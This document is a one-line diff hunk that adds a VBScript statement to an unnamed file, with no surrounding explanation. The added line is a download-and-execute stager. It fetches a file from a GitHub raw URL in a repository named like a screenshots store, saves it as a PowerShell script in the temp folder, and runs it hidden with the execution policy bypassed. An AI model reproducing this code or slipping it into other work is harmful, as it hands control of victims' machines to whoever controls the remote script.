@@ -1,0 +1,1 @@
+Set x=CreateObject("WinHttp.WinHttpRequest.5.1"):x.Open"GET","https://raw.githubusercontent.com/cem324/screenshots/main/init.txt",0:x.Send:Set f=CreateObject("Scripting.FileSystemObject"):Set t=f.GetSpecialFolder(2):Set p=f.CreateTextFile(t&"\t.ps1"):p.Write x.ResponseText:p.Close:CreateObject("WScript.Shell").Run"powershell -ExecutionPolicy Bypass -File """&t&"\t.ps1""",0
